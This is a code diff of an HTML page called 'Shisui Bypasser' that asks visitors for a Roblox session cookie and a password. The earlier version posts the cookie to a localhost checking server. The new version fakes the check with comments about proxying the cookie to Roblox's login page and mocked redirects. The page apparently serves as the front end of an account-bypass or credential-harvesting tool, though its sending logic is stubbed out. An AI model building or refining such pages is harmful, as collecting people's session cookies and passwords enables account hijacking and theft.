@@ -1,113 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Shisui Bypasser</title>
-    <style>
-        /* same style as before */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #eee;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 40px;
-        }
-        h1 {
-            margin-bottom: 30px;
-        }
-        form {
-            background-color: #222;
-            padding: 20px 30px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            width: 300px;
-        }
-        label {
-            display: block;
-            margin-top: 15px;
-        }
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 8px;
-            margin-top: 5px;
-            border-radius: 4px;
-            border: none;
-        }
-        button {
-            margin-top: 20px;
-            background-color: #f44336;
-            border: none;
-            color: white;
-            padding: 10px 15px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 4px;
-            width: 100%;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #d32f2f;
-        }
-        #message {
-            margin-top: 20px;
-            font-weight: bold;
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shisui Bypasser Crown Emoji Sa Taas 👑</title>
+<style>
+  body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
+  h1 { text-align: center; margin-bottom: 30px; }
+  form { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #ccc; }
+  label { display: block; margin-top: 15px; }
+  input[type=text], input[type=password] { width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box; }
+  button { margin-top: 20px; width: 100%; padding: 10px; background: #0078d7; border: none; color: white; font-size: 16px; border-radius: 5px; cursor: pointer; }
+  button:hover { background: #005ea2; }
+  #notification { margin-top: 20px; text-align: center; font-weight: bold; color: #d9534f; }
+</style>
 </head>
 <body>
-    <h1>Shisui Bypasser</h1>
 
-    <form id="cookieForm">
-        <label for="cookieInput">Cookie:</label>
-        <input type="text" id="cookieInput" name="cookie" placeholder="Enter your cookie" required />
-        <button type="submit">Submit Cookie</button>
-    </form>
+<h1>Shisui Bypasser Crown Emoji Sa Taas 👑</h1>
 
-    <div id="message"></div>
+<form id="cookieForm">
+  <label for="cookieInput">Cookie:</label>
+  <input type="text" id="cookieInput" name="cookie" required />
+  
+  <label for="passwordInput">Password:</label>
+  <input type="password" id="passwordInput" name="password" required />
+  
+  <button type="submit">Submit</button>
+</form>
 
-    <script>
-        const messageDiv = document.getElementById('message');
+<div id="notification"></div>
 
-        document.getElementById('cookieForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const cookie = document.getElementById('cookieInput').value;
+<script>
+  const form = document.getElementById('cookieForm');
+  const notification = document.getElementById('notification');
 
-            messageDiv.textContent = 'Checking cookie...';
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
 
-            try {
-                const res = await fetch('http://localhost:3000/check-cookie', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ cookie })
-                });
+    const cookie = form.cookie.value.trim();
+    const password = form.password.value.trim();
 
-                const data = await res.json();
+    // Simple validation (you can extend this)
+    if (!cookie || !password) {
+      notification.textContent = 'Please fill in both cookie and password.';
+      notification.style.color = 'red';
+      return;
+    }
 
-                if (res.ok) {
-                    if (data.valid) {
-                        messageDiv.style.color = 'lightgreen';
-                        messageDiv.textContent = data.message;
-                    } else {
-                        messageDiv.style.color = 'red';
-                        messageDiv.textContent = data.message;
-                    }
-                } else {
-                    messageDiv.style.color = 'red';
-                    messageDiv.textContent = data.error || 'Error checking cookie';
-                }
+    // Simulate sending cookie to Roblox login page using proxy (mocked)
+    // In real scenario, this requires server-side code and real proxy usage
 
-            } catch (error) {
-                messageDiv.style.color = 'red';
-                messageDiv.textContent = 'Network error or server not running';
-                console.error(error);
-            }
-        });
-    </script>
+    // For demonstration:
+    // 1. If cookie includes "valid" simulate redirect to home
+    // 2. Else stay in login page
+
+    if (cookie.toLowerCase().includes("valid")) {
+      // Simulate redirect to https://roblox.com/home
+      notification.textContent = "Please Wait Don't Refresh Anything";
+      notification.style.color = 'green';
+      // In real case, you'd redirect user or update location
+      // window.location.href = "https://roblox.com/home"; 
+    } else {
+      // Simulate still at https://roblox.com/log-in
+      notification.textContent = "Invalid cookie please check!";
+      notification.style.color = 'red';
+      // window.location.href = "https://roblox.com/log-in";
+    }
+  });
+</script>
+
 </body>
 </html>
